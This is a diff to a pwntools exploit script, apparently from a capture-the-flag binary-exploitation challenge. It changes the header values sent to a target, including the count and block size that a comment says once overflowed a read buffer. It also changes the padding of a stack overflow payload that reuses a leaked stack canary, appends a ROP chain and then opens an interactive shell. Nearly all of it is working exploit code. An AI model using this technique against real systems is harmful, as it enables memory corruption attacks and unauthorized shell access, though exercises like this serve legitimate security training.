@@ -12,8 +12,8 @@ stack_canary = io.recvline().decode().strip()[2:]
 io.recvuntil(b"Header (hex): ")
 print(stack_canary)
 
-count = 0xf0
-block_size = 1<<15 # this used to overflow the read buffer by multiplying it with the count
+count = 0xff
+block_size = 0
 header_data = f"deadbeef {hex(count)[2:]} {hex(block_size)[2:]}".encode()
 io.sendline(header_data)
 io.recvuntil(b"bytes): ")
@@ -47,7 +47,7 @@ payload = b"A" * 72
 payload += p64(int(stack_canary, 16))
 payload += b"A"*8
 payload += rop_chain
-payload += b'A' * (240 - len(payload))
+payload += b'A' * (255 - len(payload))
 
 io.send(payload)
 io.interactive()
